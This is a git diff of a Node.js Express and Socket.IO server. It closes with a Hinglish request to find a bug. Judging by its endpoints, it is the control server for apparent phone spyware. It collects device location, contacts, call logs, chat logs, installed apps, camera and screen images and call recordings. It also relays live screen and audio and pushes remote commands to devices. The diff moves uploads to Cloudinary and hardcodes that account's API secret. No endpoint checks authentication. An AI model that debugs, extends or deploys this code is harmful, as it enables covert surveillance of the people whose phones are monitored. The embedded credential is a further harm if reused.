@@ -3,229 +3,349 @@ const fs = require('fs');
 const path = require('path');
 const cors = require('cors');
 const bodyParser = require('body-parser');
-const http = require('http'); 
+const cloudinary = require('cloudinary').v2;
+const http = require('http'); 
 const { Server } = require("socket.io");
+const compression = require('compression'); 
 
 const app = express();
 const server = http.createServer(app);
 const PORT = process.env.PORT || 3000;
 
-// --- 1. SETUP & CONFIG ---
+// ✅ 1. OPTIMIZED SOCKET.IO SETUP
+const io = new Server(server, {
+    cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
+    },
+    maxHttpBufferSize: 1e8, // 100MB
+    pingTimeout: 60000,     
+    pingInterval: 25000,    
+    transports: ['websocket', 'polling']
+});
+
+// --- CLOUDINARY CONFIG ---
+cloudinary.config({
+    cloud_name: 'dxnh5vuik',
+    api_key: '185953318184881',
+    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
+});
+
+// --- SETUP & MIDDLEWARE ---
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
-app.use(cors({ origin: '*' })); // Allow all connections
-app.use(bodyParser.json({ limit: '50mb' })); // Increased limit for photos
-app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
+app.use(compression()); 
+app.use(cors({ origin: '*' }));
+app.use(bodyParser.json({ limit: '100mb' }));
+app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
+app.use(express.static(__dirname));
 
-// Serve Uploaded Files (Images/Audio accessible via URL)
-app.use('/uploads', express.static(UPLOADS_DIR));
+// Live Status (RAM Storage)
+let devicesStatus = {}; 
 
-// --- 2. SOCKET.IO (Simple & Stable) ---
-const io = new Server(server, {
-    cors: { origin: "*", methods: ["GET", "POST"] },
-    maxHttpBufferSize: 1e8, // 100MB buffer
-    transports: ['websocket', 'polling']
-});
-
-let devicesStatus = {}; // RAM me status save rahega
-
+// ==================================================
+//  🔥 MAIN SOCKET LOGIC
+// ==================================================
 io.on('connection', (socket) => {
-    console.log('🔌 New Connection:', socket.id);
+    
+    // 1. Join Room
+    socket.on('join', (roomID) => {
+        socket.join(roomID);
+        console.log(`🔌 Device Joined Room: ${roomID}`);
+    });
 
-    // Join Room (Device ID)
-    socket.on('join', (roomID) => {
-        socket.join(roomID);
-        console.log(`📱 Device Joined: ${roomID}`);
-    });
+    // 2. Screen Share
+    socket.on('screen-data', (data) => {
+        socket.volatile.to(data.room).emit('screen-data', data.image);
+    });
 
-    // Screen Share Data Relay
-    socket.on('screen-data', (data) => {
-        // Broadcast to admin in the same room
-        socket.to(data.room).emit('screen-data', data.image);
-    });
+    // 3. Control Events
+    socket.on('control-event', (data) => {
+        socket.to(data.room).emit('control-event', data);
+    });
 
-    // Send Commands (Socket)
-    socket.on('send-command', (data) => {
-        if(data.targetId && data.command) {
-            io.to(data.targetId).emit('command', data.command);
-        }
-    });
+    // 4. Command Handling (Socket)
+    socket.on('send-command', (data) => {
+        if (data.targetId && data.command) {
+            io.to(data.targetId).emit('command', data.command);
+            
+            // Backup for Polling
+            if (!devicesStatus[data.targetId]) devicesStatus[data.targetId] = { id: data.targetId };
+            devicesStatus[data.targetId].command = data.command;
+        }
+    });
 
-    socket.on('disconnect', () => {});
+    // 5. Audio Stream Relay
+    socket.on('audio-stream', (blob) => {
+        const rooms = socket.rooms;
+        for (const room of rooms) {
+            if (room !== socket.id) {
+                socket.to(room).emit('audio-stream', blob);
+            }
+        }
+    });
+
+    socket.on('disconnect', () => { });
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server is Running (Stable Version)');
+    res.send('✅ Server Running: Battery & Gallery Reset Ready!');
 });
 
 // ==================================================
-//  🔥 3. DATA UPLOAD (JSON Logs)
-// ==================================================
-app.post('/api/upload_data', (req, res) => { 
-    let { device_id, type, data } = req.body;
-    if (!device_id) return res.status(400).json({ error: "No Device ID" });
-
-    const id = device_id.toString().trim().toUpperCase();
-    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
-    
-    // Save to RAM for Live Status
-    if(type === 'location') {
-        try {
-            let loc = (typeof data === 'string') ? JSON.parse(data) : data;
-            if(Array.isArray(loc)) loc = loc[loc.length-1]; // Get latest
-            if(!devicesStatus[id]) devicesStatus[id] = { id: id };
-            devicesStatus[id].lat = loc.latitude || loc.lat;
-            devicesStatus[id].lon = loc.longitude || loc.lon;
-            devicesStatus[id].lastSeen = Date.now();
-        } catch(e) {}
-    }
-
-    // Save to File (Append or Overwrite)
-    // Simple logic: Read -> Append -> Write
-    let existingData = [];
-    if (fs.existsSync(filePath)) {
-        try { existingData = JSON.parse(fs.readFileSync(filePath)); } catch(e) {}
-    }
-    
-    let newData = (typeof data === 'string') ? JSON.parse(data) : data;
-    let finalData = Array.isArray(newData) ? [...newData, ...existingData] : [newData, ...existingData];
-    
-    // Limit file size (Last 2000 records only)
-    finalData = finalData.slice(0, 2000);
-
-    fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
-    res.json({ status: "success" });
-});
-
-app.get('/api/get-data/:device_id/:type', (req, res) => {
-    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
-    if (fs.existsSync(filePath)) {
-        res.sendFile(filePath);
-    } else {
-        res.json([]);
-    }
-});
-
-// ==================================================
-//  📷 4. IMAGE UPLOAD (Local Storage)
+//  ✅ UPLOAD SYSTEM (Smart Gallery Fix)
 // ==================================================
 app.post('/api/upload-image', (req, res) => {
-    let { device_id, image_data, type } = req.body; // type = 'camera', 'screen', etc.
-    if (!device_id || !image_data) return res.status(400).send("Missing Data");
+    let { device_id, image_data, type } = req.body; 
+    
+    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
+    const id = device_id.toString().trim().toUpperCase();
+    
+    // --- 🔥 GALLERY LOGIC START ---
+    let folderName = "gallery"; 
+    let publicId = Date.now().toString(); 
 
-    const id = device_id.toUpperCase();
-    const deviceFolder = path.join(UPLOADS_DIR, id);
-    if (!fs.existsSync(deviceFolder)) fs.mkdirSync(deviceFolder, { recursive: true });
+    if (type && type.includes("-")) {
+        const parts = type.split("-"); 
+        folderName = parts[0];  
+        publicId = parts[1];    
+    } else if (type && type !== "null" && type !== "") {
+        folderName = type;
+    }
+    // --- 🔥 GALLERY LOGIC END ---
 
-    // Filename logic
-    const timestamp = Date.now();
-    const filename = `${type || 'cam'}-${timestamp}.jpg`;
-    const savePath = path.join(deviceFolder, filename);
+    let folderPath = `${id}/${folderName}`; 
+    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;
 
-    // Convert Base64 to Buffer
-    const base64Data = image_data.replace(/^data:image\/\w+;base64,/, "");
-    
-    fs.writeFile(savePath, base64Data, 'base64', (err) => {
-        if (err) return res.status(500).send("Error saving");
-        
-        // Generate Public URL
-        const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${id}/${filename}`;
-        
-        // Notify Frontend via Socket
-        io.emit('new-file', { device_id: id, url: fileUrl, type: type });
-        
-        res.json({ status: "success", url: fileUrl });
-    });
+    cloudinary.uploader.upload(base64Image, 
+        { 
+            folder: folderPath, 
+            public_id: publicId, 
+            resource_type: "image", 
+            width: 1280, 
+            quality: "auto", 
+            fetch_format: "auto" 
+        }, 
+        (error, result) => {
+            if (error) return res.status(500).json({ error: "Upload Failed" });
+            io.emit('new-file', { device_id: id, url: result.secure_url, type: folderName });
+            res.json({ status: "success", url: result.secure_url });
+        }
+    );
 });
 
 // ==================================================
-//  🎤 5. AUDIO UPLOAD (Local Storage)
+//  ✅ AUDIO UPLOAD & HISTORY
 // ==================================================
 app.post('/api/upload-audio', (req, res) => {
-    let { device_id, audio_data, filename } = req.body;
-    if (!device_id || !audio_data) return res.status(400).send("Missing Data");
+    let { device_id, audio_data, filename } = req.body; 
+    
+    if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
+    const id = device_id.toString().trim().toUpperCase();
+    
+    let folderPath = `${id}/calls`; 
+    let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;
 
-    const id = device_id.toUpperCase();
-    const deviceFolder = path.join(UPLOADS_DIR, id);
-    if (!fs.existsSync(deviceFolder)) fs.mkdirSync(deviceFolder, { recursive: true });
-
-    const finalName = filename || `rec-${Date.now()}.mp3`;
-    const savePath = path.join(deviceFolder, finalName);
-    
-    const base64Data = audio_data.replace(/^data:audio\/\w+;base64,/, "");
-
-    fs.writeFile(savePath, base64Data, 'base64', (err) => {
-        if (err) return res.status(500).send("Error saving");
-        const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${id}/${finalName}`;
-        io.emit('new-audio', { device_id: id, url: fileUrl, name: finalName });
-        res.json({ status: "success", url: fileUrl });
-    });
+    cloudinary.uploader.upload(base64Audio, 
+        { folder: folderPath, public_id: filename || Date.now().toString(), resource_type: "video" }, 
+        (error, result) => {
+            if (error) return res.status(500).json({ error: "Upload Failed" });
+            io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
+            res.json({ status: "success", url: result.secure_url });
+        }
+    );
 });
 
-// ==================================================
-//  📂 6. GALLERY & FILE LIST (Reads from Folder)
-// ==================================================
+app.get('/api/audio-history/:device_id', async (req, res) => {
+    const id = req.params.device_id.trim().toUpperCase();
+    try {
+        const result = await cloudinary.search
+            .expression(`folder:${id}/calls AND resource_type:video`) 
+            .sort_by('created_at', 'desc')
+            .max_results(50)
+            .execute();
+        res.json(result.resources);
+    } catch (error) {
+        res.json([]); 
+    }
+});
+
 app.get('/api/gallery-list/:device_id', (req, res) => {
-    const id = req.params.device_id.toUpperCase();
-    const deviceFolder = path.join(UPLOADS_DIR, id);
-    
-    if (!fs.existsSync(deviceFolder)) return res.json({ photos: [] });
-
-    fs.readdir(deviceFolder, (err, files) => {
-        if (err) return res.json({ photos: [] });
-
-        // Filter only images
-        const images = files
-            .filter(file => file.endsWith('.jpg') || file.endsWith('.png'))
-            .map(file => `${req.protocol}://${req.get('host')}/uploads/${id}/${file}`)
-            .reverse(); // Newest first
-
-        res.json({ photos: images });
-    });
+    const id = req.params.device_id.toUpperCase();
+    const next_cursor = req.query.next_cursor || null;
+    
+    cloudinary.api.resources({ 
+        type: 'upload', 
+        prefix: id + "/", 
+        max_results: 100, 
+        next_cursor: next_cursor, 
+        direction: 'desc', 
+        context: true 
+    }, 
+    (error, result) => {
+        if (error) return res.json({ photos: [], next_cursor: null });
+        const photos = result.resources.map(img => img.secure_url);
+        res.json({ photos: photos, next_cursor: result.next_cursor });
+    });
 });
 
 // ==================================================
-//  ⚙️ 7. COMMAND & STATUS
+//  🔥 STATUS & COMMAND
 // ==================================================
-app.post('/api/status', (req, res) => {
-    const { device_id, model, battery, version } = req.body;
-    if(device_id) {
-        const id = device_id.toUpperCase();
-        if(!devicesStatus[id]) devicesStatus[id] = { id: id, command: "none" };
-        
-        devicesStatus[id].model = model;
-        devicesStatus[id].battery = battery;
-        devicesStatus[id].version = version;
-        devicesStatus[id].lastSeen = Date.now();
-
-        const cmd = devicesStatus[id].command || "none";
-        devicesStatus[id].command = "none"; // Clear after sending
-        res.json({ status: "success", command: cmd });
-    } else {
-        res.send("OK");
-    }
-});
-
-app.post('/api/send-command', (req, res) => {
-    let { device_id, deviceId, command } = req.body;
-    let target = device_id || deviceId;
-    if(!target) return res.status(400).json({error: "No ID"});
-    
-    target = target.toUpperCase();
-    
-    // Send via Socket
-    io.to(target).emit('command', command);
-    
-    // Save for Polling
-    if(!devicesStatus[target]) devicesStatus[target] = { id: target };
-    devicesStatus[target].command = command;
-    
-    res.json({ status: "success", command });
-});
 
 app.get('/api/admin/all-devices', (req, res) => {
-    res.json(devicesStatus);
+    res.json(devicesStatus);
 });
 
-server.listen(PORT, () => console.log(`🚀 Server Running on Port ${PORT}`));
+app.get('/api/device-status/:id', (req, res) => {
+    const id = req.params.id.toUpperCase().trim();
+    const device = devicesStatus[id];
+    if (!device) return res.json({ id: id, isOnline: false });
+    const isOnline = (Date.now() - device.lastSeen) < 60000;
+    res.json({ ...device, isOnline: isOnline });
+});
+
+app.post('/api/status', (req, res) => {
+    try {
+        let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
+        if (!device_id) return res.status(400).json({ error: "No ID" });
+
+        const id = device_id.toString().trim().toUpperCase();
+        
+        if (!devicesStatus[id]) {
+            devicesStatus[id] = { id: id, command: "none" };
+        }
+
+        devicesStatus[id].model = model || devicesStatus[id].model || "Unknown";
+        devicesStatus[id].battery = battery || level || devicesStatus[id].battery || 0;
+        devicesStatus[id].version = version || devicesStatus[id].version || "--";
+        devicesStatus[id].charging = (String(charging) === "true");
+        
+        devicesStatus[id].lat = lat || devicesStatus[id].lat || 0;
+        devicesStatus[id].lon = lon || devicesStatus[id].lon || 0;
+        devicesStatus[id].accuracy = accuracy || devicesStatus[id].accuracy || 0;
+        devicesStatus[id].speed = speed || devicesStatus[id].speed || 0;
+        
+        devicesStatus[id].lastSeen = Date.now();
+
+        let commandToSend = "none";
+        
+        if (devicesStatus[id].command && devicesStatus[id].command !== "none") {
+            commandToSend = devicesStatus[id].command;
+            devicesStatus[id].command = "none";
+        }
+
+        res.json({ status: "success", command: commandToSend });
+    } catch (e) {
+        res.status(500).json({ error: "Server Error" });
+    }
+});
+
+// ==================================================
+//  🔥 DATA STORAGE (Smart Deduplication)
+// ==================================================
+
+app.post('/api/upload_data', async (req, res) => { 
+    let { device_id, type, data } = req.body;
+    if (!device_id) return res.status(400).json({ error: "No ID" });
+    
+    const id = device_id.toString().trim().toUpperCase();
+    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
+
+    try {
+        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
+        let finalData = parsedData;
+
+        if (type === 'location') {
+            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
+            if (locObj && (locObj.lat || locObj.latitude)) {
+                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
+                devicesStatus[id].lat = locObj.lat || locObj.latitude;
+                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
+                devicesStatus[id].lastSeen = Date.now();
+            }
+        }
+
+        if (type === 'contacts') {
+            let rawList = Array.isArray(parsedData) ? parsedData : [parsedData];
+            const seenNumbers = new Set();
+            finalData = [];
+
+            for (const contact of rawList) {
+                let num = contact.phoneNumber ? contact.phoneNumber.replace(/\s+|-/g, '') : '';
+                if (num && !seenNumbers.has(num)) {
+                    seenNumbers.add(num);
+                    finalData.push(contact);
+                }
+            }
+        }
+        else if (['installed_apps', 'call_logs'].includes(type)) {
+             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
+        } 
+        else {
+            let existingData = [];
+            try {
+                if (fs.existsSync(filePath)) {
+                    const fileContent = await fs.promises.readFile(filePath, 'utf8');
+                    existingData = JSON.parse(fileContent);
+                }
+            } catch (e) { }
+
+            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
+            if (type === 'chat_logs') {
+                newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
+            }
+            finalData = [...newDataArray, ...existingData].slice(0, 5000); 
+        }
+
+        await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
+        res.json({ status: "success" });
+
+    } catch (error) {
+        console.error("Write Error:", error);
+        res.status(500).json({ status: "error" });
+    }
+});
+
+app.get('/api/get-data/:device_id/:type', async (req, res) => {
+    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
+    try {
+        if (fs.existsSync(filePath)) {
+            const readStream = fs.createReadStream(filePath);
+            readStream.pipe(res);
+        } else {
+            res.json([]);
+        }
+    } catch (e) {
+        res.json([]);
+    }
+});
+
+// ==================================================
+//  🔥 COMMAND API (Updated for Button Support)
+// ==================================================
+app.post('/api/send-command', (req, res) => {
+    // 🛑 Note: Frontend sends 'deviceId', Server usually uses 'device_id'.
+    // Yahan hum dono check kar rahe hain taaki button fail na ho.
+    
+    let { device_id, deviceId, command } = req.body;
+    
+    let targetID = device_id || deviceId; // Jo bhi mile use karo
+
+    if (!targetID || !command) return res.status(400).json({ error: "Missing Info" });
+    
+    const id = targetID.toUpperCase().trim();
+    
+    // 1. Socket se bhejo (Instant)
+    io.to(id).emit('command', command);
+    console.log(`📡 Command Sent via API: ${command} -> ${id}`);
+
+    // 2. RAM mein save karo (Polling ke liye)
+    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
+    devicesStatus[id].command = command;
+    
+    res.json({ status: "success", command: command });
+});
+
+server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`)); dekho isa mai ak side mai id hai usake andar floader bana hua hai sab ka but ab dekho ky server mai kuch problem hai ham ko nahi lagata
